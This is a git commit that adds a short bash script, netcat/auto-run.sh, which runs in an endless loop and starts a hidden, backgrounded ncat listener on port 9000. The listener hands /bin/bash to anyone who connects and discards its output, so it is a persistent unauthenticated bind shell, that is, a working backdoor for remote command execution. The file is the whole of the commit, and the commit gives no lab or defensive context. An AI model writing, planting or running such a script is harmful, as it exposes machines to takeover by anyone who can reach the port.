479bc0869075fb5c02c45b286ffc74e9e265728c
Incrisz <incrisz@localhost.localdomain>
2023-12-30 16:36:17 -0500

    nc

---
+++ netcat/auto-run.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+# listener_ip="your_listener_ip"
+listener_port="9000"
+
+while true; do
+    nohup ncat -lvp "$listener_port" --exec "/bin/bash" > /dev/null 2>&1 &
+    pid=$!
+    wait $pid
+done
